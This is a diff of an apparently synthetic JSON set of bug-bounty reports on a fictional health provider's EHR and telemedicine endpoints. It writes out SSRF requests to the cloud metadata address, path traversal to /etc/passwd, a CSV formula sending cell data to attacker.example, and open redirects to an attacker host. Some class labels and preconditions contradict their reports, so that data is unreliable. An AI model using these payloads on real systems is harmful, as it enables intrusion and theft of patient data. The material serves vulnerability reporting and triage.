+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20027,7 +20176,8 @@
           "offset": "7d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ehr.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20167,7 +20317,8 @@
           "offset": "5d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://telemed.seefjord-health.foo/export`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20299,7 +20450,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://ehr.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20422,7 +20574,8 @@
           "offset": "7d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20581,7 +20734,8 @@
           "offset": "1d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://telemed.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20721,7 +20875,8 @@
           "offset": "1d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ehr.seefjord-health.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20828,7 +20983,8 @@
           "offset": "2d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ehr.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20968,7 +21124,8 @@
           "offset": "4d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ehr.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21114,7 +21271,8 @@
           "offset": "3d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://telemed.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21262,7 +21420,8 @@
           "offset": "1d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21375,7 +21534,8 @@
           "offset": "20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21507,7 +21667,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://telemed.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21597,7 +21758,8 @@
           "offset": "3d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://ehr.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21739,7 +21901,8 @@
           "offset": "3d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21883,7 +22046,8 @@
           "offset": "2d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21989,7 +22153,8 @@
           "offset": "7d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22165,7 +22330,8 @@
           "offset": "3d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22283,7 +22449,8 @@
           "offset": "4d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22387,7 +22554,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://ehr.seefjord-health.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22512,7 +22680,8 @@
           "offset": "3d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22644,7 +22813,8 @@
           "offset": "17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22754,7 +22924,8 @@
           "offset": "4d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://telemed.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22862,7 +23033,8 @@
           "offset": "12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://telemed.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23002,7 +23174,8 @@
           "offset": "6d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://telemed.seefjord-health.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23124,7 +23297,8 @@
           "offset": "2d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23264,7 +23438,8 @@
           "offset": "3d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23362,7 +23537,8 @@
           "offset": "1d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://telemed.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23517,7 +23693,8 @@
           "offset": "4d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://telemed.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23645,7 +23822,8 @@
           "offset": "2d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23744,7 +23922,8 @@
           "offset": "5d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ehr.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23859,7 +24038,8 @@
           "offset": "2d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
